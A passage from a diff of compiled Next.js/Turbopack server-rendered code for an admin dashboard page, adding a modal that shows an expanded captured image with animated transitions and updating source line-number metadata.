+                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                    className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["cn"])("transform transition-all duration-300 ease-in-out", isModalAnimating ? "opacity-100 scale-100" : "opacity-0 scale-95"),
+                    onClick: (e)=>e.stopPropagation(),
+                    children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$image$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["default"], {
+                        src: expandedImageUrl,
+                        alt: "Expanded captured image",
+                        width: 0,
+                        height: 0,
+                        sizes: "100vw",
+                        style: {
+                            width: 'auto',
+                            height: 'auto'
+                        },
+                        className: "max-w-[90vw] max-h-[90vh] object-contain rounded-lg shadow-xl bg-white p-1"
+                    }, void 0, false, {
+                        fileName: "[project]/src/app/admin/dashboard/page.tsx",
+                        lineNumber: 248,
+                        columnNumber: 13
+                    }, this)
                 }, void 0, false, {
                     fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                    lineNumber: 214,
+                    lineNumber: 241,
                     columnNumber: 11
                 }, this)
             }, void 0, false, {
                 fileName: "[project]/src/app/admin/dashboard/page.tsx",
-                lineNumber: 210,
+                lineNumber: 233,
                 columnNumber: 9
             }, this)
         ]
